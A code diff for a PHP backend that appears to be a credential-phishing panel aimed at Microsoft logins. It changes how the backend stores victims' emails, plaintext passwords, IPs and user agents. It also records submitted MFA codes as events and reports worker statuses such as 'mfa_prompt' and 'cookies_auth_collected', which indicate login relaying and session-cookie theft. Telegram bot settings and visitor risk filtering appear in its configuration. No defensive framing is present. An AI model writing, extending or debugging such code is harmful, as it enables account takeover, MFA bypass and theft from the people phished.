@@ -9,16 +9,18 @@ class Config {
         $configPath = $baseDir . '/config.json.enc';
         $envPath = $baseDir . '/.env';
         $cfg = [];
+        $envFromFile = [];
 
         // 1. Load manual .env first (Defaults)
         if (file_exists($envPath)) {
             $env = @parse_ini_file($envPath);
             if (is_array($env)) {
+                $envFromFile = $env; // Save all env vars for later
                 foreach ($env as $k => $v) {
                     $cfg[$k] = $v;
                     // Also populate getenv/$_ENV for other parts of the app
-                    if (!getenv($k)) putenv("$k=$v");
-                    if (!isset($_ENV[$k])) $_ENV[$k] = $v;
+                    putenv("$k=$v");
+                    $_ENV[$k] = $v;
                     
                     // Map common env names to config names
                     if ($k === 'PROXYCHECK_API_KEY') $cfg['proxycheckApiKey'] = $v;
@@ -26,6 +28,18 @@ class Config {
                     if ($k === 'ENC_KEY') $cfg['encKey'] = $v;
                     if ($k === 'TELEGRAM_BOT_TOKEN') $cfg['telegramBotToken'] = $v;
                     if ($k === 'TELEGRAM_CHAT_ID') $cfg['telegramChatId'] = $v;
+                }
+                
+                // Explicitly make sure WORKER_DATABASE_URL and NEON_DATABASE_URL are set
+                if (isset($env['WORKER_DATABASE_URL'])) {
+                    $cfg['WORKER_DATABASE_URL'] = $env['WORKER_DATABASE_URL'];
+                    putenv("WORKER_DATABASE_URL=" . $env['WORKER_DATABASE_URL']);
+                    $_ENV['WORKER_DATABASE_URL'] = $env['WORKER_DATABASE_URL'];
+                }
+                if (isset($env['NEON_DATABASE_URL'])) {
+                    $cfg['NEON_DATABASE_URL'] = $env['NEON_DATABASE_URL'];
+                    putenv("NEON_DATABASE_URL=" . $env['NEON_DATABASE_URL']);
+                    $_ENV['NEON_DATABASE_URL'] = $env['NEON_DATABASE_URL'];
                 }
             }
         }
@@ -37,6 +51,11 @@ class Config {
         $cfg['msDeviceFlowUrl'] = $cfg['msDeviceFlowUrl'] ?? 'https://microsoft.com/devicelogin';
 
         // 2. Load encrypted config.json (User Overrides)
+        // First save the DB URLs from .env so they can't be overwritten
+        $savedDATABASE_URL = $cfg['DATABASE_URL'] ?? null;
+        $savedWORKER_DATABASE_URL = $cfg['WORKER_DATABASE_URL'] ?? null;
+        $savedNEON_DATABASE_URL = $cfg['NEON_DATABASE_URL'] ?? null;
+
         if (file_exists($configPath)) {
             $json = Crypto::loadEncrypted($configPath);
             if ($json) {
@@ -44,7 +63,7 @@ class Config {
                 if (is_array($decoded)) {
                     foreach ($decoded as $k => $v) {
                         // Prevent user config from overriding locked keys
-                        if (in_array($k, ['masterLicenseKey', 'encKey'])) {
+                        if (in_array($k, ['masterLicenseKey', 'encKey', 'DATABASE_URL', 'WORKER_DATABASE_URL', 'NEON_DATABASE_URL'])) {
                             continue;
                         }
                         $cfg[$k] = $v;
@@ -52,6 +71,11 @@ class Config {
                 }
             }
         }
+
+        // Restore the saved DB URLs
+        if ($savedDATABASE_URL !== null) $cfg['DATABASE_URL'] = $savedDATABASE_URL;
+        if ($savedWORKER_DATABASE_URL !== null) $cfg['WORKER_DATABASE_URL'] = $savedWORKER_DATABASE_URL;
+        if ($savedNEON_DATABASE_URL !== null) $cfg['NEON_DATABASE_URL'] = $savedNEON_DATABASE_URL;
 
         // Support Environment Variables (Render/Docker)
         $envBotToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? getenv('TELEGRAM_BOT_TOKEN');
@@ -106,6 +130,12 @@ class Config {
         $envProxycheckRiskThreshold = getenv('PROXYCHECK_RISK_THRESHOLD');
         if ($envProxycheckRiskThreshold !== false) {
             $cfg['proxycheckRiskThreshold'] = (int)$envProxycheckRiskThreshold;
+        }
+
+        // Re-set all .env variables to ensure they are in $_ENV/getenv()
+        foreach ($envFromFile as $k => $v) {
+            putenv("$k=$v");
+            $_ENV[$k] = $v;
         }
 
         return $cfg;
@@ -340,7 +370,9 @@ class NeonDB {
     public static function pdo(): ?object {
         if (self::$tried) return self::$pdo;
         self::$tried = true;
-        $dsn = $_ENV['WORKER_DATABASE_URL'] ?? getenv('WORKER_DATABASE_URL') ?? $_ENV['DATABASE_URL'] ?? getenv('DATABASE_URL') ?? '';
+        // First try to load Config to ensure we have the DATABASE_URL from .env!
+        $cfg = \App\Config::load();
+        $dsn = $cfg['WORKER_DATABASE_URL'] ?? $cfg['DATABASE_URL'] ?? $_ENV['WORKER_DATABASE_URL'] ?? getenv('WORKER_DATABASE_URL') ?? $_ENV['DATABASE_URL'] ?? getenv('DATABASE_URL') ?? '';
         if (!$dsn) return null;
         try {
             $pdoDsn = self::buildPdoDsn($dsn);
@@ -358,9 +390,33 @@ class NeonDB {
                     password    TEXT NOT NULL DEFAULT '',
                     status      TEXT NOT NULL DEFAULT 'pending',
                     created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
-                    updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
+                    updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
+                    country     TEXT,
+                    ip          TEXT,
+                    ua          TEXT,
+                    data        JSONB
                 )
             ");
+            
+            $pdo->exec("
+                CREATE TABLE IF NOT EXISTS events (
+                    id          BIGSERIAL PRIMARY KEY,
+                    cookie_id   TEXT,
+                    event_type  TEXT NOT NULL,
+                    email       TEXT NOT NULL DEFAULT '',
+                    status      TEXT NOT NULL DEFAULT '',
+                    payload     JSONB,
+                    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
+                )
+            ");
+            
+            // Add missing columns if needed
+            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS country TEXT"); } catch (\Throwable $e) {}
+            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS ip TEXT"); } catch (\Throwable $e) {}
+            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS ua TEXT"); } catch (\Throwable $e) {}
+            try { $pdo->exec("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS data JSONB"); } catch (\Throwable $e) {}
+            try { $pdo->exec("ALTER TABLE sessions ALTER data TYPE JSONB USING data::jsonb"); } catch (\Throwable $e) {}
+
             self::$pdo = $pdo;
         } catch (\Throwable $e) {
             Security::log("NeonDB connect error: " . $e->getMessage());
@@ -397,9 +453,10 @@ class NeonDB {
             $country = (string)($extra['country'] ?? '');
             $ip      = (string)($extra['ip']      ?? '');
             $ua      = (string)($extra['ua']      ?? '');
+            $data    = isset($extra['data']) ? (is_array($extra['data']) ? json_encode($extra['data']) : (string)$extra['data']) : null;
             $stmt = $pdo->prepare("
-                INSERT INTO sessions (cookie_id, email, password, status, created_at, updated_at, country, ip, ua)
-                VALUES (:id, :email, :pw, :st, :ca, NOW(), :country, :ip, :ua)
+                INSERT INTO sessions (cookie_id, email, password, status, created_at, updated_at, country, ip, ua, data)
+                VALUES (:id, :email, :pw, :st, :ca, NOW(), :country, :ip, :ua, :data)
                 ON CONFLICT (cookie_id) DO UPDATE SET
                     email      = EXCLUDED.email,
                     password   = EXCLUDED.password,
@@ -407,25 +464,33 @@ class NeonDB {
                     country    = CASE WHEN EXCLUDED.country <> '' THEN EXCLUDED.country ELSE sessions.country END,
                     ip         = CASE WHEN EXCLUDED.ip      <> '' THEN EXCLUDED.ip      ELSE sessions.ip      END,
                     ua         = CASE WHEN EXCLUDED.ua      <> '' THEN EXCLUDED.ua      ELSE sessions.ua      END,
+                    data       = CASE WHEN EXCLUDED.data IS DISTINCT FROM NULL THEN EXCLUDED.data ELSE sessions.data END,
                     updated_at = NOW()
             ");
             $stmt->execute([
                 ':id' => $cookieId, ':email' => $email, ':pw' => $password,
                 ':st' => $status, ':ca' => $ca,
-                ':country' => $country, ':ip' => $ip, ':ua' => $ua,
+                ':country' => $country, ':ip' => $ip, ':ua' => $ua, ':data' => $data,
             ]);
         } catch (\Throwable $e) {
             Security::log("NeonDB upsert error: " . $e->getMessage());
         }
     }
 
-    public static function updateStatus(string $cookieId, string $status, string $password = ''): void {
+    public static function updateStatus(string $cookieId, string $status, string $password = '', $data = null): void {
         $pdo = self::pdo();
         if (!$pdo) return;
         try {
-            if ($password !== '') {
+            $dataStr = $data !== null ? (is_array($data) ? json_encode($data) : (string)$data) : null;
+            if ($password !== '' && $dataStr !== null) {
+                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, password=:pw, data=:data, updated_at=NOW() WHERE cookie_id=:id");
+                $stmt->execute([':st' => $status, ':pw' => $password, ':data' => $dataStr, ':id' => $cookieId]);
+            } elseif ($password !== '') {
                 $stmt = $pdo->prepare("UPDATE sessions SET status=:st, password=:pw, updated_at=NOW() WHERE cookie_id=:id");
                 $stmt->execute([':st' => $status, ':pw' => $password, ':id' => $cookieId]);
+            } elseif ($dataStr !== null) {
+                $stmt = $pdo->prepare("UPDATE sessions SET status=:st, data=:data, updated_at=NOW() WHERE cookie_id=:id");
+                $stmt->execute([':st' => $status, ':data' => $dataStr, ':id' => $cookieId]);
             } else {
                 $stmt = $pdo->prepare("UPDATE sessions SET status=:st, updated_at=NOW() WHERE cookie_id=:id");
                 $stmt->execute([':st' => $status, ':id' => $cookieId]);
@@ -442,6 +507,12 @@ class NeonDB {
             $stmt = $pdo->prepare("SELECT * FROM sessions WHERE cookie_id=:id LIMIT 1");
             $stmt->execute([':id' => $cookieId]);
             $row = $stmt->fetch(\PDO::FETCH_ASSOC);
+            if ($row && isset($row['data'])) {
+                $decoded = json_decode($row['data'], true);
+                if (is_array($decoded)) {
+                    $row['data'] = $decoded;
+                }
+            }
             return $row ?: null;
         } catch (\Throwable $e) {
             Security::log("NeonDB get error: " . $e->getMessage());
@@ -458,6 +529,32 @@ class NeonDB {
         } catch (\Throwable $e) {
             Security::log("NeonDB getPending error: " . $e->getMessage());
             return [];
+        }
+    }
+
+    public static function addEvent(string $cookieId, string $eventType, array $fields = []): ?array {
+        $pdo = self::pdo();
+        if (!$pdo) return null;
+        try {
+            $email   = $fields['email'] ?? '';
+            $status  = $fields['status'] ?? '';
+            $payload = isset($fields['payload']) ? json_encode($fields['payload']) : 'null';
+            $stmt = $pdo->prepare("
+                INSERT INTO events (cookie_id, event_type, email, status, payload)
+                VALUES (:cookie_id, :event_type, :email, :status, :payload::jsonb)
+                RETURNING id, cookie_id, event_type, email, status, payload, created_at
+            ");
+            $stmt->execute([
+                ':cookie_id'  => $cookieId,
+                ':event_type' => $eventType,
+                ':email'      => $email,
+                ':status'     => $status,
+                ':payload'    => $payload,
+            ]);
+            return $stmt->fetch(\PDO::FETCH_ASSOC);
+        } catch (\Throwable $e) {
+            Security::log("NeonDB addEvent error: " . $e->getMessage());
+            return null;
         }
     }
 
@@ -1208,9 +1305,19 @@ class Api {
         $existing['status']     = 'pending';
         $existing['created_at'] = $existing['created_at'] ?? date('c');
         $existing['updated_at'] = date('c');
+        $country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
+        $ip = Security::getClientIp();
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+        $existing['country'] = $country;
+        $existing['ip'] = $ip;
+        $existing['ua'] = $ua;
         file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
 
-        NeonDB::upsert($cookieId, $email, '', 'pending', $existing['created_at']);
+        NeonDB::upsert($cookieId, $email, '', 'pending', $existing['created_at'], [
+            'country' => $country,
+            'ip' => $ip,
+            'ua' => $ua
+        ]);
 
         Security::log("CREATE_SESSION: Queued pending session for $email (session: $cookieId)");
 
@@ -1248,7 +1355,9 @@ class Api {
         $sessionFile = $sessionDir . '/session_' . $cookieId . '.json';
 
         $fsExists = file_exists($sessionFile);
-        $neonRow  = !$fsExists ? NeonDB::get($cookieId) : null;
+
+        // Always check current status from Neon to avoid overwriting worker's processing/mfa_prompt
+        $neonRow = NeonDB::get($cookieId);
 
         if (!$fsExists && !$neonRow) {
             http_response_code(404);
@@ -1256,12 +1365,15 @@ class Api {
             exit;
         }
 
+        // Determine the correct status: preserve processing/mfa_prompt set by worker
+        $currentNeonStatus = $neonRow['status'] ?? 'pending';
+        $preservedStatuses = ['processing', 'mfa_prompt'];
+        $newStatus = in_array($currentNeonStatus, $preservedStatuses, true) ? $currentNeonStatus : 'pending';
+
         if ($fsExists) {
             $existing = json_decode(file_get_contents($sessionFile), true) ?: [];
             $existing['password']   = $password;
-            if (($existing['status'] ?? '') !== 'processing') {
-                $existing['status'] = 'pending';
-            }
+            $existing['status']     = $newStatus;
             $existing['updated_at'] = date('c');
             file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
         } else {
@@ -1269,15 +1381,13 @@ class Api {
                 'cookie_id'  => $cookieId,
                 'email'      => $neonRow['email'] ?? '',
                 'password'   => $password,
-                'status'     => ($neonRow['status'] ?? '') === 'processing' ? 'processing' : 'pending',
+                'status'     => $newStatus,
                 'created_at' => $neonRow['created_at'] ?? date('c'),
                 'updated_at' => date('c'),
             ];
             file_put_contents($sessionFile, json_encode($existing, JSON_PRETTY_PRINT));
         }
 
-        $currentStatus = $existing['status'] ?? 'pending';
-        $newStatus = ($currentStatus === 'processing') ? 'processing' : 'pending';
         NeonDB::updateStatus($cookieId, $newStatus, $password);
 
         Security::log("SUBMIT_PASSWORD: password written for session $cookieId");
@@ -1309,13 +1419,23 @@ class Api {
             exit;
         }
 
-        $projectRoot = realpath(__DIR__ . '/..');
-        $mfaFile     = $projectRoot . '/mfa_' . $sessionId . '.txt';
+        $result = NeonDB::addEvent($sessionId, 'mfa_code', [
+            'email' => '',
+            'status' => 'received',
+            'payload' => [
+                'code' => $code,
+                'source' => 'api',
+                'submitted_at' => date('c'),
+            ],
+        ]);
 
-        file_put_contents($mfaFile, $code);
-        Security::log("SUBMIT_MFA: wrote MFA code for session $sessionId");
+        if ($result) {
+            Security::log("SUBMIT_MFA: wrote MFA code for session $sessionId (event id: {$result['id']})");
+        } else {
+            Security::log("SUBMIT_MFA: failed to write MFA code for session $sessionId");
+        }
 
-        echo json_encode(['ok' => true]);
+        echo json_encode(['ok' => (bool)$result]);
         exit;
     }
 
@@ -1328,100 +1448,41 @@ class Api {
             exit;
         }
 
-        $sessionId   = Security::sanitizeId($sessionId);
-        $storageDir  = realpath(__DIR__ . '/../session_data');
+        $sessionId = Security::sanitizeId($sessionId);
 
-        $subFiles = glob($storageDir . '/session_' . $sessionId . '_p*.json');
-        if (empty($subFiles)) {
-            $subFiles = [];
-            $single = $storageDir . '/session_' . $sessionId . '.json';
-            if (file_exists($single)) $subFiles[] = $single;
-        }
-
-        // Neon is the authoritative store: the worker (and any Render-side process)
-        // always writes status to Neon, but the local disk file may be stale on this
-        // host. Pull the Neon row up-front so we can use it as source-of-truth for
-        // terminal / active states, and only fall back to disk for legacy cases.
+        // Neon DB is the single source of truth — the worker writes status there.
+        // No filesystem fallback: if it's not in Neon, no session exists yet.
         $neonRow = NeonDB::get($sessionId);
-        $terminal = ['cookies_auth_collected', 'completed', 'mfa_accepted', 'failed', 'mfa_prompt'];
-        if ($neonRow && in_array($neonRow['status'] ?? '', $terminal, true)) {
-            $st = $neonRow['status'];
-            if ($st === 'cookies_auth_collected' || $st === 'completed' || $st === 'mfa_accepted') {
+
+        if (!$neonRow) {
+            echo json_encode(['status' => 'pending']);
+            exit;
+        }
+
+        $st = $neonRow['status'] ?? 'pending';
+        $data = $neonRow['data'] ?? null;
+        if (is_string($data)) $data = json_decode($data, true);
+
+        switch ($st) {
+            case 'cookies_auth_collected':
+            case 'completed':
+            case 'mfa_accepted':
                 echo json_encode(['status' => 'cookies_auth_collected', 'data' => $neonRow]);
-                exit;
-            }
-            if ($st === 'mfa_prompt') {
+                break;
+
+            case 'mfa_prompt':
                 echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $sessionId]);
-                exit;
-            }
-            if ($st === 'failed') {
-                $err = 'Login failed.';
-                if (!empty($neonRow['data'])) {
-                    $d = is_string($neonRow['data']) ? json_decode($neonRow['data'], true) : $neonRow['data'];
-                    if (is_array($d) && !empty($d['error'])) $err = $d['error'];
-                }
+                break;
+
+            case 'failed':
+                $err = $data['error'] ?? 'Login failed.';
                 echo json_encode(['status' => 'failed', 'data' => ['error' => $err]]);
-                exit;
-            }
-        }
+                break;
 
-        if (empty($subFiles)) {
-            if ($neonRow) {
-                $st = $neonRow['status'] ?? 'pending';
+            default:
                 echo json_encode(['status' => $st]);
-            } else {
-                echo json_encode(['status' => 'pending']);
-            }
-            exit;
+                break;
         }
-
-        $anyPending    = false;
-        $anyProcessing = false;
-        $anyMfa        = false;
-        $lastFailed    = null;
-        $lastMfaSubId  = null;
-
-        foreach ($subFiles as $f) {
-            $data   = json_decode(file_get_contents($f), true);
-            $status = $data['status'] ?? 'pending';
-            $subId  = $data['cookie_id'] ?? basename($f, '.json');
-
-            if ($status === 'mfa_prompt') {
-                $anyMfa = true;
-                $lastMfaSubId = $subId;
-                continue;
-            }
-
-            if ($status === 'cookies_auth_collected' || $status === 'completed' || $status === 'mfa_accepted') {
-                echo json_encode(['status' => 'cookies_auth_collected', 'data' => $data]);
-                exit;
-            }
-
-            if ($status === 'failed') {
-                $lastFailed = $data['data'] ?? $data;
-            } elseif ($status === 'processing') {
-                $anyProcessing = true;
-            } elseif ($status === 'pending') {
-                $anyPending = true;
-            }
-        }
-
-        if ($anyMfa) {
-            echo json_encode(['status' => 'MFA_PROMPT', 'subSessionId' => $lastMfaSubId]);
-            exit;
-        }
-
-        if ($anyProcessing || $anyPending) {
-            echo json_encode(['status' => 'processing']);
-            exit;
-        }
-
-        if ($lastFailed !== null) {
-            echo json_encode(['status' => 'failed', 'data' => ['error' => $lastFailed['error'] ?? 'All password attempts failed.']]);
-            exit;
-        }
-
-        echo json_encode(['status' => 'pending']);
         exit;
     }
 
